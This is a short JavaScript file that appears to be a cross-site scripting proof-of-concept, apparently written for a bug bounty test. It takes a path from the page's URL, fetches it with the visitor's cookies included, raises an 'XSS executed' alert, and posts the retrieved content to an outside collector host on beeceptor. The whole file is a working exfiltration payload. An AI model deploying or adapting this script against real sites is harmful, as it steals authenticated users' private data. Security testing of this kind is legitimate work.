
function extract() {
    (async()=>{
        const urlParams = new URLSearchParams(window.location.search);
        let path = urlParams.get("path");

       await fetch(path,{credentials:'include'})
            .then(x=> x.text())
            .then(data => {

                alert("XSS executed");
                fetch('https://g6g-yeswehack.free.beeceptor.com', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/html'},
                    body: JSON.stringify(data)
                });
            });
    })();
}

extract();